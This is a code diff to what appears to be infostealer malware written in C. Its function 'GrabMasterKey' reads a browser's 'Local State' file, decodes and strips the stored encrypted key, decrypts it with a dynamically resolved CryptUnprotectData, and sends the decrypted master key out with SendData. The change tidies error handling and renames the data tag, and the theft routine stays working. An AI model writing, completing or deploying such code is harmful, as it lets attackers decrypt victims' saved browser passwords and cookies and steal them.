@@ -15,11 +15,10 @@
 
 BOOL (WINAPI *pCryptUnprotectData)(DATA_BLOB*, LPWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
 
-int GrabMasterKey(unsigned short *path) {
+void GrabMasterKey(unsigned short *path) {
     HANDLE              FileHandle           = {0};
     UNICODE_STRING      PathUnicode          = {0};
     OBJECT_ATTRIBUTES   PathObj              = {0};
-    IO_STATUS_BLOCK     IOstatus             = {0};
     DATA_BLOB           VaultKey             = {0};
     DATA_BLOB           CryptedVaultKey      = {0};
     void               *Crypt32Dll           = {0};
@@ -39,17 +38,20 @@ int GrabMasterKey(unsigned short *path) {
     ConcatStringW(TempPath, L"\\Local State", PathSize);
 
     InitPathObj(TempPath, &PathObj, &PathUnicode);
-    InitFile(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, &IOstatus, FILE_OPEN);
-
-    FileSize = FileSizeG(FileHandle, &IOstatus);
-    
-    FileBuffer = AllocMemory((SIZE_T)FileSize);
-    if (FileBuffer == NULL) {
-/*         printf("NULL FILEBUFF\n"); */
+    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
         return;
     }
 
-    ReadBuffer(FileHandle, &IOstatus, FileBuffer, FileSize);
+    FileSize = GetFileSizeY(FileHandle);
+    
+    FileBuffer = AllocMemory((SIZE_T)FileSize);
+    if (FileBuffer == NULL) {
+        return;
+    }
+
+    if (ReadBuffer(FileHandle, FileBuffer, FileSize) != 0) {
+        return;
+    }
 
 
     while(FileSize > k) {
@@ -71,12 +73,12 @@ int GrabMasterKey(unsigned short *path) {
     }
 
     if (Base64String == NULL) {
-        return NULL;
+        return;
     }
 
     int DecodedLength = DecodeBase64(Base64String, len(Base64String), DecodedString);
     if (DecodedLength == 1) {
-        return NULL;
+        return;
     }
 
     MovMemory(DecodedString + 5, DecodedString, DecodedLength);
@@ -85,31 +87,27 @@ int GrabMasterKey(unsigned short *path) {
 
     Crypt32Dll = LoadDll(L"crypt32.dll");
     if (Crypt32Dll == NULL) {
-/*         printf("NO DLL\n"); */
-        return 1;
+        return;
     }
     pCryptUnprotectData = GetFuncAddress(Crypt32Dll, CRYPTOUNPROTECTDATA);
     if (pCryptUnprotectData == NULL) {
-/*         printf("NO FUNC\n"); */
-        return 1;
+        return;
     }
 
     if (pCryptUnprotectData(&CryptedVaultKey, NULL, NULL, NULL, NULL, 0, &VaultKey) != 1) {
-/*         printf("FUNC FAILED\n"); */
-        return 1;
+        return;
     }
 
-    TotalBufferSize = TotalBufferLength(L"HASH", 32);
+    TotalBufferSize = TotalBufferLength(L"ZERO", 32);
 
     buffer = AllocMemory((SIZE_T)TotalBufferSize);
     if (buffer == NULL) {
-/*         printf("NULL BUFF\n"); */
-        return 1;
+        return;
     }
 
     IntToString(FileSizeString, 32);
 
-    SendData(NULL, "HASH", 32, FileSizeString, buffer, VaultKey.pbData, FALSE);
+    SendData(NULL, "ZERO", 32, FileSizeString, buffer, VaultKey.pbData, FALSE);
 
     FreeMemory(FileBuffer);
 }
